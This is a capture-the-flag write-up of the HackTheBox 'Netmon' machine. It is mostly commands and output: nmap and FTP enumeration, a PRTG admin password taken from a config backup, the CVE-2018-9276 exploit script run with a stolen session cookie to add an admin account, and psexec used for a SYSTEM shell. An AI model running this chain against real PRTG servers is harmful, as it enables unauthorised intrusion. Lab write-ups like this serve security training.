---
layout: post
title: Hackthebox Netmon Writeup
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-07-01/netmon-badge.png)
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.<br>
This is a write-up of machine "Netmon" on that website.<br>

## Solution
### 1. Initial Enumeration
TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.152 -sC -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-28 12:40 EEST
Stats: 0:16:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.32% done; ETC: 13:07 (0:10:54 remaining)
Nmap scan report for 10.10.10.152
Host is up (0.31s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 06-24-19  03:13PM                   74 output.txt
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-06-28 13:07:09
|_  start_date: 2019-06-24 07:07:57

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1616.17 seconds
{% endhighlight %}

SMB enumeration:
{% highlight shell %}
root@kali:~# smbclient -L 10.10.10.152
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_ACCESS_DENIED
{% endhighlight %}

FTP enumeration:
{% highlight shell %}
root@kali:~# ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       <DIR>          inetpub
07-16-16  09:18AM       <DIR>          PerfLogs
02-25-19  10:56PM       <DIR>          Program Files
02-03-19  12:28AM       <DIR>          Program Files (x86)
02-03-19  08:08AM       <DIR>          Users
02-25-19  11:49PM       <DIR>          Windows
226 Transfer complete.
{% endhighlight %}

### 2. Getting User
Pretty straightforward.<br>
We can take advantage of opening FTP and access to the user folder as annonymous.
{% highlight shell %}
ftp> pwd
257 "/users/Public" is current directory.

ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.30 secs (0.1083 kB/s)
{% endhighlight %}
{% highlight shell %}
root@kali:~# cat user.txt 
dd58ce67b49e15105e88096c8d9255a5
{% endhighlight %}

### 3. Getting Root
On port 80, we can confirm that <a href="https://www.paessler.com/prtg">PRTG network monitor</a> is running and its version is "18.1.37.13946".
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-07-01/2019-07-01-11-11-59.png)

In the exploit-db, we can find possible exploit for the PRTG Network monitor.
{% highlight shell %}
root@kali:~# searchsploit PRTG
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution      | exploits/windows/webapps/46527.sh
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)  | exploits/windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                   | exploits/java/webapps/34108.txt
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

We have a RCE but we need the credential of PRTG user.<br>
According to <a href="https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data">this</a> page, it is stored in the directory "/Programdata/Paessler/PRTG Network Monitor"
{% highlight shell %}
ftp> pwd
257 "/Programdata/Paessler/PRTG Network Monitor" is current directory.

ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:40AM       <DIR>          Configuration Auto-Backups
07-01-19  12:17AM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
07-01-19  12:17AM       <DIR>          Logs (Web Server)
07-01-19  12:22AM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
07-01-19  04:28AM              1723418 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.
{% endhighlight %}

In the file "PRTG Configuration.old.bak", we have a plaintext credential.<br>
But to login, we need to change the password to "PrTg@dmin2019"
{% highlight shell %}
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>
{% endhighlight %}

Then, launch the Burp suite and login to PRTG console.<br>
This is because we have to grab the authenticated cookie to run the exploit code.
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-07-01/2019-07-01-12-29-40.png)

After that run the exploit with the cookie.<br>
This creates a new admin user "pentest:P3nT3st!".
{% highlight shell %}
root@kali:~# ./46527.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0ZDRjY2MjdBLUMzNjEtNEY0Mi1CQ0JGLUU3NUEzQzlBRDZDMX0%3D"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
{% endhighlight %}

Now we have administrator credential.
Try to access with "psexec.py" which is installed by default in the package Impacket.
{% highlight shell %}
root@kali:~# /usr/share/doc/python-impacket/examples/psexec.py pentest@10.10.10.152
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file zNVocYtQ.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service aGrP on 10.10.10.152.....
[*] Starting service aGrP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
{% endhighlight %}

root.txt is in the directory "C:\Users\Administrator\Desktop"
{% highlight shell %}
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
3018977fb944bf1878f75b879fba67cc
{% endhighlight %}
